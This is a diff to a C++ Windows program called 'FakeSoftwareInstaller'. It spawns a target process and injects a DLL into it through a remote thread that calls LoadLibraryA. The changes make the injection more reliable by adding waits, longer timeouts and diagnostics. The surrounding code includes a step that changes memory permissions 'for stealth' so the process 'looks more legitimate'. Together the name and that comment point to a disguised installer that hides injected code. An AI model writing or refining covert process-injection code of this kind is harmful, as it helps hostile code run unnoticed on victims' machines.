@@ -1,4 +1,4 @@
-﻿#include "framework.h"
+#include "framework.h"
 #include "FakeSoftwareInstaller.h"
 #include <windows.h>
 #include <commctrl.h>
@@ -512,11 +512,20 @@ DWORD SpawnTargetProcess()
         return 0;
     }
 
+    // Wait until the target process finishes its UI initialization.
+    // WaitForInputIdle ensures the message loop is up and all initial
+    // DLLs have been loaded, so our injection won't race against the loader.
+    DWORD waitResult = WaitForInputIdle(pi.hProcess, 5000);
+    if (waitResult != 0)
+    {
+        LogActivity("WaitForInputIdle returned " + std::to_string(waitResult) + " — proceeding anyway");
+    }
+
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
 
-    // Give it time to initialize
-    Sleep(500);
+    // Extra safety margin for module initialization
+    Sleep(1000);
 
     return pi.dwProcessId;
 }
@@ -644,13 +653,30 @@ bool InjectDLL(DWORD processId, const char* dllPath)
         }
         LogActivity("  -> Remote thread created successfully");
 
-        // Wait for thread to complete
+        // Wait for the remote thread to finish (LoadLibraryA call)
         LogActivity("  -> Waiting for DLL to load...");
-        WaitForSingleObject(hThread, 5000);
+        DWORD waitRes = WaitForSingleObject(hThread, 10000);
+        if (waitRes == WAIT_TIMEOUT)
+        {
+            LogActivity("  -> WARNING: Remote thread timed out after 10 seconds");
+        }
         
-        // Get the exit code (DLL base address)
+        // Get the exit code — this is the HMODULE returned by LoadLibraryA.
+        // A value of 0 means LoadLibraryA returned NULL (DLL failed to load).
         DWORD exitCode = 0;
         GetExitCodeThread(hThread, &exitCode);
+        
+        if (exitCode == 0)
+        {
+            LogActivity("  -> WARNING: LoadLibraryA returned NULL — DLL may have failed to load");
+            LogActivity("  -> Check if the DLL is a valid 64-bit binary and all dependencies are present");
+        }
+        else
+        {
+            std::stringstream ss3;
+            ss3 << "  -> LoadLibraryA returned module handle: 0x" << std::hex << exitCode;
+            LogActivity(ss3.str());
+        }
         
         // Step 5: Memory protection cleanup for stealth (RWX → RX)
         // Change memory permissions to look more legitimate
